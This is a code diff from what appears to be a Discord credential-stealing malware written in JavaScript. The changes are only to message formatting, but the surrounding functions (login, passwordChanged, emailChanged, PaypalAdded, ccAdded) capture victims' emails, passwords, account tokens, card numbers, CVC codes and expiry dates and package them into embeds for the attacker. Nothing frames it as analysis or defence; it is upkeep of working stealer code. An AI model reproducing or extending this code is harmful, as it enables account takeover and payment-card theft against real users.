@@ -196,9 +196,9 @@ const getBilling = async (token) => {
   let billing = "";
   data.forEach((x) => {
     if (x.type === 2 && !x.invalid) {
-      billing += "\`Valid:\`" + " <:paypal:973924768933875722>";
+      billing += " <:paypal:973924768933875722>";
     } else if (x.type === 1 && !x.invalid) {
-      billing += "\`Valid:\`" + "<:card:973868127240732673>";
+      billing += "<:card:973868127240732673>";
     } else {
       billing = "\`Invalid\`";
     }
@@ -350,7 +350,7 @@ const login = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            name: json.username + "#" + json.discriminator + " (" + json.id + ")",
             value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
@@ -410,7 +410,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            name: json.username + "#" + json.discriminator + " (" + json.id + ")",
             value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
@@ -475,7 +475,7 @@ const emailChanged = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            name: json.username + "#" + json.discriminator + " (" + json.id + ")",
             value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
@@ -535,7 +535,7 @@ const PaypalAdded = async (email, password, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            name: json.username + "#" + json.discriminator + " (" + json.id + ")",
             value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
@@ -595,7 +595,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
         color: config.embed_color,
         fields: [
           {
-            name: json.username + "#" + json.discriminator + "(" + json.id + ")",
+            name: json.username + "#" + json.discriminator + " (" + json.id + ")",
             value: `\`\`\`${token}\`\`\``,
             inline: false,
           },
